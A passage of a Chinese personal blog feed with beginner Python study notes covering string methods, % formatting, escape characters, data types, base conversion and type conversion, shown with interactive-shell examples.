punctuation">)</span><span class="token string">'hello,world'</span></code></pre><p>7.<code>center()</code>返回一个原字符串居中,并使用空格填充至长度 width 的新字符串。默认填充字符为空格。居中显示<br>语法:<br>str.center(width[,fillchar])<br>width——字符串的总宽度<br>fillchar—–填充字符</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token operator">=</span><span class="token string">'hello'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>center<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token string">'@'</span><span class="token punctuation">)</span><span class="token string">'@@@@@hello@@@@@'</span><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'dage'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>center<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token string">'$'</span><span class="token punctuation">)</span><span class="token string">'$$$$$$dage$$$$$$'</span></code></pre><p>8.<code>count()</code>方法用于统计字符串里某个字符出现的次数。可选参数为在字符串搜索的开始与结束位置。空格也是字符。<br>语法：<br>str.count(canshu,start,end)<br>canshu—–搜索的子字符串<br>start—-字符串开始搜索的位置，默认为第一个字符，第一个字符索引值为0<br>end—–字符串中结束搜索的位置。默认为字符串的最后一个位置。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'hello,the greatwall'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token number">2</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'l'</span><span class="token punctuation">)</span><span class="token number">4</span></code></pre><p>9.<code>endswith()</code> 方法用于判断字符串是否以指定后缀结尾，如果以指定后缀结尾返回True，否则返回False。可选参数”start”与”end”为检索字符串的开始与结束位置。<br>语法:<br><code>str.endswith(canshu,start,end)</code><br>canshu—-该参数可以是一个字符串或者是一个元素<br>start—-字符串开始的位置<br>end——字符中结束的位置</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'$wkx$syf'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'syf'</span><span class="token punctuation">)</span><span class="token boolean">True</span></code></pre><p>10.<code>startswith()</code> 方法用于检查字符串是否是以指定子字符串开头，如果是则返回 True，否则返回 False。如果参数 beg 和 end 指定值，则在指定范围内检查。<br>语法:<br><code>str.startwith(str,begin,rend)</code><br>str—–检测的字符串。<br>begin—-可选参数用于设置字符串检测的起始位置。<br>end—-可选参数用于设置字符串检测的结束位置</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'$wkx'</span><span class="token punctuation">)</span><span class="token boolean">True</span></code></pre><p>11.<code>find()</code> 方法检测字符串中是否包含子字符串 str ，如果指定 begin（开始） 和 end（结束） 范围，则检查是否包含在指定范围内，如果包含子字符串返回开始的索引值，否则返回-1。（没找到就返回-1）<br>语法:<br>str.find(str,begin,end)<br>str—–指定检索的字符串<br>begin—-开始索引，默认为0<br>end—–结束索引，默认为字符串的长度</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'/wkx/ncl/syf.py'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'.py'</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'.html'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span></code></pre><p>12.<code>format()</code>和%格式化功能一样，基本语法是通过 {} 和：来代替以前的%。format函数可以接受不限个参数，位置可以不按顺序。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token operator">=</span><span class="token string">'name:&#123;&#125;,age:&#123;&#125;,sex:&#123;&#125;'</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>lxj<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'wkx'</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token string">'male'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>name<span class="token punctuation">:</span>wkx<span class="token punctuation">,</span>age<span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">,</span>sex<span class="token punctuation">:</span>male<span class="token operator">>></span><span class="token operator">></span> lxj<span class="token operator">=</span><span class="token string">'name:&#123;a&#125;,age:&#123;b&#125;,sex:&#123;c&#125;'</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span> <span class="token punctuation">(</span>lxj<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token string">'syf'</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">19</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'male'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>name<span class="token punctuation">:</span>syf<span class="token punctuation">,</span>age<span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">,</span>sex<span class="token punctuation">:</span>male</code></pre><p>13.digit英文解释：数字<br><code>isdigit()</code>判断字符串内是否全是数字。如果字符串只包含数字则返回 True 否则返回 False。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'zxcv0221'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token boolean">False</span><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'123456789'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token boolean">True</span></code></pre><p>14.<code>isalpha()</code> 方法检测字符串是否只由字母组成。如果字符串至少有一个字符并且所有字符都是字母则返回 True,否则返回 False</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'zxcv0221'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token boolean">False</span><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'zxcv'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token boolean">True</span></code></pre><p>15.<code>index()</code> 方法检测字符串中是否包含子字符串 str ，如果指定 beg（开始） 和 end（结束） 范围，则检查是否包含在指定范围内，该方法与 python <code>find()</code>方法一样，只不过如果str不在 string中会报一个异常。<br><img src="https://img-blog.csdnimg.cn/20200301180811461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>16.<code>replace()</code> 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。<br>语法：<br><code>str.replace(old,new,max)</code><br>old—-将被替换的子字符串<br>new—-新字符串，用于替换old子字符串<br>cishu—-指定替换次数</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'this is test'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'is'</span><span class="token punctuation">,</span><span class="token string">'are'</span><span class="token punctuation">)</span><span class="token string">'thare are test'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'is'</span><span class="token punctuation">,</span><span class="token string">'are'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">'thare is test'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'is'</span><span class="token punctuation">,</span><span class="token string">'are'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token string">'thare are test'</span></code></pre><p>17.<code>split()</code>通过指定分隔符对字符串进行切片，如果参数num 有指定值，则仅分隔 num 个子字符串<br>语法：<br><code>str.split(&#39;分隔符&#39;,num)</code><br>分隔符默认为所有的空字符，包括空格、换行(\n)、制表符(\t)等。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'lxj:wkx:syf:ncl:lalala'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'lxj:wkx:syf:ncl:lalala'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'lxj'</span><span class="token punctuation">,</span> <span class="token string">'wkx'</span><span class="token punctuation">,</span> <span class="token string">'syf'</span><span class="token punctuation">,</span> <span class="token string">'ncl'</span><span class="token punctuation">,</span> <span class="token string">'lalala'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'lxj'</span><span class="token punctuation">,</span> <span class="token string">'wkx'</span><span class="token punctuation">,</span> <span class="token string">'syf:ncl:lalala'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'lxj'</span><span class="token punctuation">,</span> <span class="token string">'wkx'</span><span class="token punctuation">,</span> <span class="token string">'syf'</span><span class="token punctuation">,</span> <span class="token string">'ncl:lalala'</span><span class="token punctuation">]</span></code></pre><p>18.<code>isspace()</code> 方法检测字符串是否只由空格组成。<br>如果字符串中只包含空格，则返回 True，否则返回 False.和将一段空字符串使用strip处理后判断是否等于’’一样。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'        '</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">''</span><span class="token boolean">True</span></code></pre><p>19.<code>swapcase()</code> 方法用于对字符串的大小写字母进行转换。<br>返回大小写字母转换后生成的新字符串。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'I\'m waiting my love!'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>swapcase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">"i'M WAITING MY LOVE!"</span><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'asdkdKDSJCN'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>swapcase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'ASDKDkdsjcn'</span></code></pre><p>20.<code>ljust()</code> 方法返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。<br>语法：<br><code>str.ljust(width,fillchar)</code><br>width—–指定字符串长度<br>fillchar—-填充字符，默认为空格<br><code>rjust() </code>方法返回一个原字符串右对齐,并使用空格填充至长度 width 的新字符串。如果指定的长度小于字符串的长度则返回原字符串。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'wkx'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token string">'wkx&amp;&amp;&amp;&amp;&amp;&amp;&amp;'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token string">'&amp;&amp;&amp;&amp;&amp;&amp;&amp;wkx'</span></code></pre><p>OK，先简单介绍这么多，我天，我还记不下来呢，好多啊，这还都是比较常用的，害，记东西什么的最烦了。🙄🙄🙄🙄<br>字符串格式化符号及含义<br>| 符号 | 说明 |<br>|–|–|<br>|%c  | 格式化字符及其ASCII码 |<br>|%s|格式化字符串|<br>|%d|格式化整数|<br>|%o|格式化无符号八进制数|<br>|%x|格式化无符号十六进制数|<br>|%X|格式化无符号十六进制数（大写）|<br>|%f|格式化定点数，可指定小数点后的精度|<br>|%e|用科学计数法格式化定点数|<br>|%E|同%e 用科学计数法格式化定点数|<br>|%g|根据值的大小决定使用%f或%e|<br>|%G|跟%g一样，根据值的大小决定使用%f或%E|</p><p>呼，真多，，，😭😭😭😭<br>按顺序来：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">################################1.##########################</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%c'</span><span class="token operator">%</span> <span class="token number">97</span><span class="token string">'a'</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%c %c %c'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token string">'a b c'</span><span class="token comment">#################################2##########################</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%s'</span> <span class="token operator">%</span> <span class="token string">'nothing is impossible'</span><span class="token string">'nothing is impossible'</span><span class="token comment">#################################3.#########################</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%d+%d=%d'</span><span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token string">'4+5=9'</span><span class="token comment">#################################4##########################</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%o'</span><span class="token operator">%</span> <span class="token number">10</span><span class="token string">'12'</span><span class="token comment">#################################5##########################</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%x'</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token string">'a'</span><span class="token comment">###############################6###########################</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%X'</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token string">'A'</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%X'</span> <span class="token operator">%</span> <span class="token number">160</span><span class="token string">'A0'</span><span class="token comment">#############################7##############################</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%f'</span> <span class="token operator">%</span> <span class="token number">37.698</span><span class="token string">'37.698000'</span><span class="token comment">##############################8#############################</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%e'</span> <span class="token operator">%</span> <span class="token number">37.698</span><span class="token string">'3.769800e+01'</span><span class="token comment">###############################9############################</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%E'</span> <span class="token operator">%</span> <span class="token number">37.698</span><span class="token string">'3.769800E+01'</span><span class="token comment">#############################10#############################</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%g'</span> <span class="token operator">%</span> <span class="token number">37.698</span><span class="token string">'37.698'</span></code></pre><p>最后再总结下转义字符<br>|符号| 说明 |<br>|–|–|<br>| &#39; |  单引号|<br>|&quot;| 双引号|<br>|\a|发出系统响铃声|<br>|\b|退格符|<br>|\n|换行符|<br>|\t|横向制表符（tab）|<br>|\v|纵向制表符|<br>|\r|回车符|<br>|\f|换页符|<br>|\o|八进制数代表的字符|<br>|\x|十六进制数代表的字符|<br>|\0|表示一个空字符|<br>|\\|反斜杠|</p><p>呼。。。累，，终于结束了。最近脑阔疼，我在想是不是熬夜太多了，不行不行，今天早点睡。不然真成秃头小宝贝了。想想都可怕。溜了溜了<br><img src="https://img-blog.csdnimg.cn/20200301203822702.jpg" alt="在这里插入图片描述" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python入坑学习笔记(2)</title>
      <link href="/posts/f16af311/"/>
      <url>/posts/f16af311/</url>
      
        <content type="html"><![CDATA[<h3 id="变量和数据类型"><a href="#变量和数据类型" class="headerlink" title="变量和数据类型"></a>变量和数据类型</h3><p>变量和数据类型在编程语言里倒是没有多少不同，python这门编程语言也是，上学期刚学过C语言，所以学起其他语言会省力一点。<br>变量来源于数学，是计算机语言中能储存计算结果或能表示值抽象概念。变量可以通过变量名访问。在指令式语言中，变量通常是可变的。<br><strong>数据类型</strong>（几种比较常用的）<br>1.整型（用<code>int</code>来表示)：python里的整型可以表示二进制、八进制、十进制、十六进制。<br>2.浮点型：跟C里的一样，表示小数。<br>3.字符串型：在python这里字符串用单引号或者双引号串起来都可以，不像C，只能用双引号。<br>*4.布尔型：布尔值只有True、False两种值，python里，可以直接使用这两个布尔值，（不过大小写要注意）<br>*5.复数型：跟数学上的复数表示一样，两者不一样的地方是虚部的i换成了j<br>    上面几种，有两个我用“<code>*</code>”标注起来了，这两种是我之前学C的时候没有遇到的，所以我就做了个标记。<br> 下面做个实例，用用这几个数据类型。<br> 在Python中可以使用type函数对变量的类型进行检查。使用type()检查变量的类型<br> <img src="https://img-blog.csdnimg.cn/20200213005442790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br> <code>str</code>是字符串类型<br> <code>complex</code>是复数类型<br><code>bool</code>布尔类型<br>还可以使用Python中内置的函数对变量类型进行转换。</p><ul><li>int()：将一个数值或字符串转换成整数，可以指定进制。</li><li>float()：将一个字符串转换成浮点数。</li><li>str()：将指定的对象转换成字符串形式，可以指定编码。</li><li>chr()：将整数转换成该编码对应的字符串（一个字符）。</li><li>ord()：将字符串（一个字符）转换成对应的编码（整数）。<h4 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h4>进制转换也是困扰我好长时间的问题，因为没有经常使用，所以记了忘，忘了再记，害<del>~</del>今天我把它记下来，再记一遍！！</li></ul><pre class="language-go" data-language="go"><code class="language-go">dec <span class="token operator">=</span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'10进制数为：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"转换为二进制为："</span><span class="token punctuation">,</span> <span class="token function">bin</span><span class="token punctuation">(</span>dec<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"转换为八进制为："</span><span class="token punctuation">,</span> <span class="token function">oct</span><span class="token punctuation">(</span>dec<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"转换为十六进制为："</span><span class="token punctuation">,</span> <span class="token function">hex</span><span class="token punctuation">(</span>dec<span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token string">'101010'</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"二进制字符串转换成十进制数为："</span><span class="token punctuation">,</span><span class="token function">int</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token string">'36'</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"八进制字符串转换成十进制数为："</span><span class="token punctuation">,</span><span class="token function">int</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token string">'FFF'</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"十六进制字符串转换成十进制数为："</span><span class="token punctuation">,</span><span class="token function">int</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>#运行结果<span class="token punctuation">:</span><span class="token number">10</span>进制数为：<span class="token number">10</span>转换为二进制为： <span class="token number">0</span>b1010转换为八进制为： <span class="token number">0</span>o12转换为十六进制为： <span class="token number">0xa</span>二进制字符串转换成十进制数为： <span class="token number">42</span>八进制字符串转换成十进制数为： <span class="token number">30</span>十六进制字符串转换成十进制数为： <span class="token number">4095</span></code></pre><h3 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h3><table><thead><tr><th>运算符</th><th>涵义</th></tr></thead><tbody><tr><td><code>+</code>、<code>-</code>、<code>*</code>、<code>/</code></td><td><code>加</code>、<code>减</code>、<code>乘</code>、<code>除</code></td></tr><tr><td><code>==</code>、<code>&gt;=</code>、<code>&lt;=</code>、<code>!=</code></td><td><code>等于</code>、<code>大于等于</code>、<code>小于等于</code>、<code>不等于</code></td></tr><tr><td><code>**</code>、<code>//</code>、<code>&lt;&lt;</code>、<code>&gt;&gt;</code></td><td><code>指数</code>、<code>整除</code>、<code>左移</code>、<code>右移</code></td></tr><tr><td><code>and</code>、<code>or</code></td><td><code>和</code>、<code>或</code></td></tr><tr><td>这些都是最常用的运算符，在实际开发中，如果搞不清楚运算符的优先级，可以使用括号来确保运算的执行顺序。</td><td></td></tr><tr><td>简单的加减乘除就不用说了，跟C的样子没什么区别。</td><td></td></tr><tr><td>这次我决定换个方式学习python，就是学习小甲鱼的方法——边写实例边学习新知识，就是实战中学习。<a href="https://www.bilibili.com/video/av4050443?p=1">小甲鱼python！</a> 下面看看效果。</td><td></td></tr><tr><td><strong>字符串合并</strong></td><td></td></tr></tbody></table><pre class="language-go" data-language="go"><code class="language-go"><span class="token operator">>></span><span class="token operator">></span> yourfriend <span class="token operator">=</span> <span class="token string">'康康'</span><span class="token operator">>></span><span class="token operator">></span> myfriend <span class="token operator">=</span> <span class="token string">'开心'</span><span class="token operator">>></span><span class="token operator">></span> ourfriend <span class="token operator">=</span> yourfriend <span class="token operator">+</span> myfriend<span class="token operator">>></span><span class="token operator">></span> <span class="token function">print</span><span class="token punctuation">(</span>ourfriend<span class="token punctuation">)</span>康康开心</code></pre><p>简单的字符串合并在python中就可以这样实现，感觉比C简单多了。继续……<br><strong>转义字符</strong><br>转义字符是<code>\</code>。比如：你想打印<code>let&#39;s go</code>这个<code>&#39;</code>怎么办呢???直接打印恐怕是不行！！，先试试：<img src="https://img-blog.csdnimg.cn/20200218210550546.png" alt="在这里插入图片描述" loading="lazy"><br>看,报错了。果然不行，这个时候用到了转义字符<br><img src="https://img-blog.csdnimg.cn/20200218210821785.png" alt="在这里插入图片描述" loading="lazy"><br>看下对比！！！很明显转义字符起作用了。<br><strong>长字符串</strong><br>如果遇到长的字符串怎么打印呢，？比如：歌词吧！：<br>这一天 我终于与你相见<br>你露出了已久不见的笑脸<br>你的小酒窝 让我浮想联翩<br>我真的好久都没这种感觉<br>你像 花儿一样很美<br>美的让人沉醉<br>让我忘了我是谁<br>你的美像一个刺猬<br>句句刺我心扉<br>让我带着你微笑回味<br>这个就应该用到<code>三重引号</code>什么是<code>三重引号</code>，看例子<br><img src="https://img-blog.csdnimg.cn/20200218212110861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>嘿嘿！！这样多好。。<br><strong>e记法</strong><br>在数据中有时候会出现非常大的数，像：<code>150000000000</code>、<code>0.0000000000025</code>之类的数，我们记起来非常麻烦，所以就有了e记法。看样例：</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">150000000000000000000</span><span class="token number">150000000000000000000</span><span class="token operator">>></span><span class="token operator">></span> <span class="token number">1.5e11</span><span class="token number">150000000000.0</span><span class="token operator">>></span><span class="token operator">></span> <span class="token number">0.0000000000025</span><span class="token number">2.5e-12</span></code></pre><p>e记法比较省事，规律搞明白用处非常多！！<br><strong>布尔类型的小规律</strong><br>都知道布尔类型只有True和False，其实布尔类型可以说是特殊的整型，True代表1、False代表0。具体看下示例:<br><img src="https://img-blog.csdnimg.cn/20200218214422946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>很明显，是可以的，而图中报错的地方相信都明白——零不能做除数。不过，这个就当是了解一下，在计算中这么做不合适。！！！<br><strong>数据类型间的转换</strong><br>1.将字符串类型转换为整型</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token string">'520'</span><span class="token operator">>></span><span class="token operator">></span> b <span class="token operator">=</span> <span class="token function">int</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token function">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token number">520</span></code></pre><p>2.浮点型转换为整型</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token number">5.99</span><span class="token operator">>></span><span class="token operator">></span> c <span class="token operator">=</span> <span class="token function">int</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token function">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token number">5</span></code></pre><p>这里需要注意的是，python在这儿做的是<strong>截断处理</strong>，就是将小数点后面的数全部截掉！！而不是数学中的四舍五入。<br>3.字符串转换成浮点型</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token string">'520'</span><span class="token operator">>></span><span class="token operator">></span> d <span class="token operator">=</span> <span class="token function">float</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token function">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token number">520.0</span></code></pre><p>这个不用多做解释，都理解。<br>整数也一样</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token number">520</span><span class="token operator">>></span><span class="token operator">></span> e <span class="token operator">=</span> <span class="token function">float</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token function">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token number">520.0</span></code></pre><p>很简单的。。。<br>4.其他类型转换成字符串类型</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token number">520</span><span class="token operator">>></span><span class="token operator">></span> b <span class="token operator">=</span> <span class="token function">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> b<span class="token string">'520'</span><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token number">5.99</span><span class="token operator">>></span><span class="token operator">></span> c <span class="token operator">=</span><span class="token function">str</span><span class="token punctuation">(</span>a<span 